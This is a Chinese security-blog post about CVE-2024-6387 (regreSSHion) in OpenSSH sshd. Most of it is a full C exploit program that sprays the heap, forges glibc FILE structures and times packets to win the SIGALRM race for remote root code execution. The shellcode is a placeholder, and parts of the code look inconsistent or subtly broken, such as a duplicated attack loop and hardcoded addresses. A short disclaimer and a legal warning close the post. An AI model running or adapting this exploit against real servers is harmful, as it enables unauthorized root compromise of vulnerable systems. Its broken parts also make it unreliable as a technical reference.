#  SSH也能存在RCE?   
巢安实验室  巢安实验室   2024-07-01 23:30  
  
## OpenSSH 介绍  
  
  
OpenSSH是一种提供安全网络通信的开源软件，它实现了SSH协议，允许用户在不安全的网络环境中进行远程登录、文件传输和命令执行等操作，同时确保所有传输的数据都经过加密处理。  
## 描述  
  
针对 CVE-2024-6387 的漏洞利用，针对基于 glibc 的 Linux 系统上 OpenSSH 服务器 （ sshd ） 中的信号处理程序争用条件。由于 SIGALRM 在处理程序中调用了 async-signal-unsafe 函数，该漏洞允许以 root 身份远程执行代码。  
##   
## 漏洞详情  
  
  
该漏洞以 OpenSSH 中的 SIGALRM 处理程序争用条件为目标 sshd。  
  
**受影响的版本**  
```
OpenSSH 8.5p1 至 9.8p1。
```  
  
**漏洞利用**  
  
由于易受攻击 SIGALRM 的处理程序调用 async-signal-unsafe 函数，以 root 身份远程执行代码。  
  
**EXP**  
```
/** 7etsuo-regreSSHion.c
 * -------------------------------------------------------------------------
 * SSH-2.0-OpenSSH_9.2p1 Exploit
 * -------------------------------------------------------------------------
 *
 * Exploit Title  : SSH Exploit for CVE-2024-6387 (regreSSHion)
 * Author         : 7etsuo
 * Date           : 2024-07-01
 *
 * Description:
 * Targets a signal handler race condition in OpenSSH's
 * server (sshd) on glibc-based Linux systems. It exploits a vulnerability
 * where the SIGALRM handler calls async-signal-unsafe functions, leading
 * to rce as root.
 *
 * Notes:
 * 1. Shellcode        : Replace placeholder with actual payload.
 * 2. GLIBC_BASES      : Needs adjustment for specific target systems.
 * 3. Timing parameters: Fine-tune based on target system responsiveness.
 * 4. Heap layout      : Requires tweaking for different OpenSSH versions.
 * 5. File structure offsets: Verify for the specific glibc version.
 * -------------------------------------------------------------------------
 */

#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120
#define MAX_STARTUPS 100
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)

// Possible glibc base addresses (for ASLR bypass)
uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof (GLIBC_BASES) / sizeof (GLIBC_BASES[0]);

// Shellcode placeholder (replace with actual shellcode)
unsigned char shellcode[] = "\x90\x90\x90\x90";

int setup_connection (const char *ip, int port);
void send_packet (int sock, unsigned char packet_type,
                  const unsigned char *data, size_t len);
void prepare_heap (int sock);
void time_final_packet (int sock, double *parsing_time);
int attempt_race_condition (int sock, double parsing_time,
                            uint64_t glibc_base);
double measure_response_time (int sock, int error_type);
void create_public_key_packet (unsigned char *packet, size_t size,
                               uint64_t glibc_base);
void create_fake_file_structure (unsigned char *data, size_t size,
                                 uint64_t glibc_base);
void send_ssh_version (int sock);
int receive_ssh_version (int sock);
void send_kex_init (int sock);
int receive_kex_init (int sock);
int perform_ssh_handshake (int sock);

int
main (int argc, char *argv[])
{
  if (argc != 3)
    {
      fprintf (stderr, "Usage: %s <ip> <port>\n", argv[0]);
      exit (1);
    }

  const char *ip = argv[1];
  int port = atoi (argv[2]);
  double parsing_time = 0;
  int success = 0;

  srand (time (NULL));

  // Attempt exploitation for each possible glibc base address
  for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++)
    {
      uint64_t glibc_base = GLIBC_BASES[base_idx];
      printf ("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);

      // The advisory mentions "~10,000 tries on average"
      for (int attempt = 0; attempt < 20000 && !success; attempt++)
        {
          if (attempt % 1000 == 0)
            {
              printf ("Attempt %d of 20000\n", attempt);
            }

          int sock = setup_connection (ip, port);
          if (sock < 0)
            {
              fprintf (stderr, "Failed to establish connection, attempt %d\n",
                       attempt);
              continue;
            }

          if (perform_ssh_handshake (sock) < 0)
            {
              fprintf (stderr, "SSH handshake failed, attempt %d\n", attempt);
              close (sock);
              continue;
            }

          prepare_heap (sock);
          time_final_packet (sock, &parsing_time);

          if (attempt_race_condition (sock, parsing_time, glibc_base))
            {
              printf ("Possible exploitation success on attempt %d with glibc "
                      "base 0x%lx!\n",
                      attempt, glibc_base);
              success = 1;
              break;
            }

          close (sock);
          usleep (100000); // 100ms delay between attempts, as mentioned in the
                           // advisory
        }
    }

  return !success;
}

int
setup_connection (const char *ip, int port)
{
  int sock = socket (AF_INET, SOCK_STREAM, 0);
  if (sock < 0)
    {
      perror ("socket");
      return -1;
    }

  struct sockaddr_in server_addr;
  memset (&server_addr, 0, sizeof (server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons (port);
  if (inet_pton (AF_INET, ip, &server_addr.sin_addr) <= 0)
    {
      perror ("inet_pton");
      close (sock);
      return -1;
    }

  if (connect (sock, (struct sockaddr *)&server_addr, sizeof (server_addr))
      < 0)
    {
      perror ("connect");
      close (sock);
      return -1;
    }

  // Set socket to non-blocking mode
  int flags = fcntl (sock, F_GETFL, 0);
  fcntl (sock, F_SETFL, flags | O_NONBLOCK);

  return sock;
}

void
send_packet (int sock, unsigned char packet_type, const unsigned char *data,
             size_t len)
{
  unsigned char packet[MAX_PACKET_SIZE];
  size_t packet_len = len + 5;

  packet[0] = (packet_len >> 24) & 0xFF;
  packet[1] = (packet_len >> 16) & 0xFF;
  packet[2] = (packet_len >> 8) & 0xFF;
  packet[3] = packet_len & 0xFF;
  packet[4] = packet_type;

  memcpy (packet + 5, data, len);

  if (send (sock, packet, packet_len, 0) < 0)
    {
      perror ("send_packet");
    }
}

void
send_ssh_version (int sock)
{
  const char *ssh_version = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n";
  if (send (sock, ssh_version, strlen (ssh_version), 0) < 0)
    {
      perror ("send ssh version");
    }
}

int
receive_ssh_version (int sock)
{
  char buffer[256];
  ssize_t received;
  do
    {
      received = recv (sock, buffer, sizeof (buffer) - 1, 0);
    }
  while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

  if (received > 0)
    {
      buffer[received] = '\0';
      printf ("Received SSH version: %s", buffer);
      return 0;
    }
  else if (received == 0)
    {
      fprintf (stderr, "Connection closed while receiving SSH version\n");
    }
  else
    {
      perror ("receive ssh version");
    }
  return -1;
}

void
send_kex_init (int sock)
{
  unsigned char kexinit_payload[36] = { 0 };
  send_packet (sock, 20, kexinit_payload, sizeof (kexinit_payload));
}

int
receive_kex_init (int sock)
{
  unsigned char buffer[1024];
  ssize_t received;
  do
    {
      received = recv (sock, buffer, sizeof (buffer), 0);
    }
  while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

  if (received > 0)
    {
      printf ("Received KEX_INIT (%zd bytes)\n", received);
      return 0;
    }
  else if (received == 0)
    {
      fprintf (stderr, "Connection closed while receiving KEX_INIT\n");
    }
  else
    {
      perror ("receive kex init");
    }
  return -1;
}

int
perform_ssh_handshake (int sock)
{
  send_ssh_version (sock);
  if (receive_ssh_version (sock) < 0)
    return -1;
  send_kex_init (sock);
  if (receive_kex_init (sock) < 0)
    return -1;
  return 0;
}

void
prepare_heap (int sock)
{
  // Packet a: Allocate and free tcache chunks
  for (int i = 0; i < 10; i++)
    {
      unsigned char tcache_chunk[64];
      memset (tcache_chunk, 'A', sizeof (tcache_chunk));
      send_packet (sock, 5, tcache_chunk, sizeof (tcache_chunk));
      // These will be freed by the server, populating tcache
    }

  // Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
  for (int i = 0; i < 27; i++)
    {
      // Allocate large chunk (~8KB)
      unsigned char large_hole[8192];
      memset (large_hole, 'B', sizeof (large_hole));
      send_packet (sock, 5, large_hole, sizeof (large_hole));

      // Allocate small chunk (320B)
      unsigned char small_hole[320];
      memset (small_hole, 'C', sizeof (small_hole));
      send_packet (sock, 5, small_hole, sizeof (small_hole));
    }

  // Packet c: Write fake headers, footers, vtable and _codecvt pointers
  for (int i = 0; i < 27; i++)
    {
      unsigned char fake_data[4096];
      create_fake_file_structure (fake_data, sizeof (fake_data),
                                  GLIBC_BASES[0]);
      send_packet (sock, 5, fake_data, sizeof (fake_data));
    }

  // Packet d: Ensure holes are in correct malloc bins (send ~256KB string)
  unsigned char large_string[MAX_PACKET_SIZE - 1];
  memset (large_string, 'E', sizeof (large_string));
  send_packet (sock, 5, large_string, sizeof (large_string));
}

void
create_fake_file_structure (unsigned char *data, size_t size,
                            uint64_t glibc_base)
{
  memset (data, 0, size);

  struct
  {
    void *_IO_read_ptr;
    void *_IO_read_end;
    void *_IO_read_base;
    void *_IO_write_base;
    void *_IO_write_ptr;
    void *_IO_write_end;
    void *_IO_buf_base;
    void *_IO_buf_end;
    void *_IO_save_base;
    void *_IO_backup_base;
    void *_IO_save_end;
    void *_markers;
    void *_chain;
    int _fileno;
    int _flags;
    int _mode;
    char _unused2[40];
    void *_vtable_offset;
  } *fake_file = (void *)data;

  // Set _vtable_offset to 0x61 as described in the advisory
  fake_file->_vtable_offset = (void *)0x61;

  // Set up fake vtable and _codecvt pointers
  *(uint64_t *)(data + size - 16)
      = glibc_base + 0x21b740; // fake vtable (_IO_wfile_jumps)
  *(uint64_t *)(data + size - 8) = glibc_base + 0x21d7f8; // fake _codecvt
}

void
time_final_packet (int sock, double *parsing_time)
{
  double time_before = measure_response_time (sock, 1);
  double time_after = measure_response_time (sock, 2);
  *parsing_time = time_after - time_before;

  printf ("Estimated parsing time: %.6f seconds\n", *parsing_time);
}

double
measure_response_time (int sock, int error_type)
{
  unsigned char error_packet[1024];
  size_t packet_size;

  if (error_type == 1)
    {
      // Error before sshkey_from_blob
      packet_size = snprintf ((char *)error_packet, sizeof (error_packet),
                              "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3");
    }
  else
    {
      // Error after sshkey_from_blob
      packet_size = snprintf ((char *)error_packet, sizeof (error_packet),
                              "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9");
    }

  struct timespec start, end;
  clock_gettime (CLOCK_MONOTONIC, &start);

  send_packet (sock, 50, error_packet,
               packet_size); // SSH_MSG_USERAUTH_REQUEST

  char response[1024];
  ssize_t received;
  do
    {
      received = recv (sock, response, sizeof (response), 0);
    }
  while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

  clock_gettime (CLOCK_MONOTONIC, &end);

  double elapsed
      = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
  return elapsed;
}

void
create_public_key_packet (unsigned char *packet, size_t size,
                          uint64_t glibc_base)
{
  memset (packet, 0, size);

  size_t offset = 0;
  for (int i = 0; i < 27; i++)
    {
      // malloc(~4KB) - This is for the large hole
      *(uint32_t *)(packet + offset) = CHUNK_ALIGN (4096);
      offset += CHUNK_ALIGN (4096);

      // malloc(304) - This is for the small hole (potential FILE structure)
      *(uint32_t *)(packet + offset) = CHUNK_ALIGN (304);
      offset += CHUNK_ALIGN (304);
    }

  // Add necessary headers for the SSH public key format
  memcpy (packet, "ssh-rsa ", 8);

  // Place shellcode in the heap via previous allocations
  memcpy (packet + CHUNK_ALIGN (4096) * 13 + CHUNK_ALIGN (304) * 13, shellcode,
          sizeof (shellcode));

  // Set up the fake FILE structures within the packet
  for (int i = 0; i < 27; i++)
    {
      create_fake_file_structure (packet + CHUNK_ALIGN (4096) * (i + 1)
                                      + CHUNK_ALIGN (304) * i,
                                  CHUNK_ALIGN (304), glibc_base);
    }
}

int
attempt_race_condition (int sock, double parsing_time, uint64_t glibc_base)
{
  unsigned char final_packet[MAX_PACKET_SIZE];
  create_public_key_packet (final_packet, sizeof (final_packet), glibc_base);

  // Send all but the last byte
  if (send (sock, final_packet, sizeof (final_packet) - 1, 0) < 0)
    {
      perror ("send final packet");
      return 0;
    }

  // Precise timing for last byte
  struct timespec start, current;
  clock_gettime (CLOCK_MONOTONIC, &start);

  while (1)
    {
      clock_gettime (CLOCK_MONOTONIC, &current);
      double elapsed = (current.tv_sec - start.tv_sec)
                       + (current.tv_nsec - start.tv_nsec) / 1e9;
      if (elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001))
        { // 1ms before SIGALRM
          if (send (sock, &final_packet[sizeof (final_packet) - 1], 1, 0) < 0)
            {
              perror ("send last byte");
              return 0;
            }
          break;
        }
    }

  // Check for successful exploitation
  char response[1024];
  ssize_t received = recv (sock, response, sizeof (response), 0);
  if (received > 0)
    {
      printf ("Received response after exploit attempt (%zd bytes)\n",
              received);
      // Analyze response to determine if we hit the "large" race window
      if (memcmp (response, "SSH-2.0-", 8) != 0)
        {
          printf ("Possible hit on 'large' race window\n");
          return 1;
        }
    }
  else if (received == 0)
    {
      printf (
          "Connection closed by server - possible successful exploitation\n");
      return 1;
    }
  else if (errno == EWOULDBLOCK || errno == EAGAIN)
    {
      printf ("No immediate response from server - possible successful "
              "exploitation\n");
      return 1;
    }
  else
    {
      perror ("recv");
    }
  return 0;
}

int
perform_exploit (const char *ip, int port)
{
  int success = 0;
  double parsing_time = 0;
  double timing_adjustment = 0;

  for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++)
    {
      uint64_t glibc_base = GLIBC_BASES[base_idx];
      printf ("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);

      for (int attempt = 0; attempt < 10000 && !success; attempt++)
        {
          if (attempt % 1000 == 0)
            {
              printf ("Attempt %d of 10000\n", attempt);
            }

          int sock = setup_connection (ip, port);
          if (sock < 0)
            {
              fprintf (stderr, "Failed to establish connection, attempt %d\n",
                       attempt);
              continue;
            }

          if (perform_ssh_handshake (sock) < 0)
            {
              fprintf (stderr, "SSH handshake failed, attempt %d\n", attempt);
              close (sock);
              continue;
            }

          prepare_heap (sock);
          time_final_packet (sock, &parsing_time);

          // Implement feedback-based timing strategy
          parsing_time += timing_adjustment;

          if (attempt_race_condition (sock, parsing_time, glibc_base))
            {
              printf ("Possible exploitation success on attempt %d with glibc "
                      "base 0x%lx!\n",
                      attempt, glibc_base);
              success = 1;
              // In a real exploit, we would now attempt to interact with the
              // shell
            }
          else
            {
              // Adjust timing based on feedback
              timing_adjustment += 0.00001; // Small incremental adjustment
            }

          close (sock);
          usleep (100000); // 100ms delay between attempts, as mentioned in the
                           // advisory
        }
    }

  return success;
}
```  
  
**参考链接**  
```
https://github.com/acrono/cve-2024-6387-poc
https://mp.weixin.qq.com/s/fdnpHexti9k6FvxkPX55ng
```  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
